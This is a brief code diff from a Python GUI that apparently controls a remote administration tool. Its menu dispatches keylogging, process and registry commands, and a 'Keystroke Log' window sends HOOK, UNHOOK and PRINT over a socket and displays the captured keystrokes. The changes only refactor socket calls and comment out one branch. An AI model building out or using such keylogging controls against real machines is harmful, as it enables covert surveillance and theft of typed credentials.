@@ -27,8 +27,8 @@ class GUI:
             self.appScene()
         # elif data == "TAKEPIC":
         #     self.ScreenshotScene()
-        elif data == "REGISTRY":
-            self.registryScene()
+        # elif data == "REGISTRY":
+        #     self.registryScene()
         elif data == "KEYLOG":
             self.keystrokeScene()
         elif data == "PROCESS":
@@ -167,14 +167,14 @@ class GUI:
         key_window.title("Keystroke Log")
 
         def hook_click():
-            self.client.Cli_Sock.send("HOOK".encode()) # Send the command to the server
+            self.client.send("HOOK".encode()) # Send the command to the server
 
         def unhook_click():
-            self.client.Cli_Sock.send("UNHOOK".encode())
+            self.client.send("UNHOOK".encode())
 
         def print_click():
-            self.client.Cli_Sock.send("PRINT".encode())
-            data = self.client.Cli_Sock.recv(5000).decode()
+            self.client.send("PRINT".encode())
+            data = self.client.recv(5000).decode()
             print (data)
             self.textbox.insert(tk.END, data)
 
